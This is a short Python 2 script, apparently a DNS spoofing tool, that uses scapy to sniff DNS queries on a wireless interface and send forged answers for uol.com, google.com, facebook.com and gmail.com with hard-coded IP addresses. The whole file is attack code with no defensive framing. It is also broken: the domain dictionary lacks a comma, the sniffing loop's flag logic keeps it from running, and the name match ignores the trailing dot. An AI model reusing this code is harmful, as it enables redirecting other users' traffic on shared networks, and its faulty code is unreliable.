from threading import Thread
from Queue import Queue, Empty
from scapy.all import *

m_iface = "wlan1"
m_finished = False

def print_summary(packet):
    target = {'uol.com':'200.147.67.142',
    'google.com':'173.194.118.35',
    'facebook.com':'173.252.120.6'
    'gmail.com':'216.58.222.5'
    }
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(target) > 0:
      for targetDomain, ipAddressTarget in target.items():
        if packet.getlayer(DNS).qd.qname == targetDomain:
          try:
            requestIP = packet[IP]
            requestUDP = packet[UDP]
            requestDNS = packet[DNS]
            requestDNSQR = packet[DNSQR]      
            
            responseIP = IP(src=requestIP.dst, dst=requestIP.src)
            responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
            responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
            responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
            answer = responseIP/responseUDP/responseDNS
            send(answer)
          except:
            print "Unexpected error:"
            print "Exception..."
    else:
      print packet.summary()

def threaded_sniff_target(q):
  global m_finished
  while m_finished:
    sniff(iface = m_iface, count = 10, filter = 'udp port 53', prn = lambda x : q.put(x))
  m_finished = True

def threaded_sniff():
  q = Queue()
  sniffer = Thread(target = threaded_sniff_target, args = (q,))
  sniffer.daemon = True
  sniffer.start()
  while (not m_finished):
    try:
      pkt = q.get(timeout = 1)
      print_summary(pkt)
    except Empty:
      pass

threaded_sniff()
n =  raw_input()
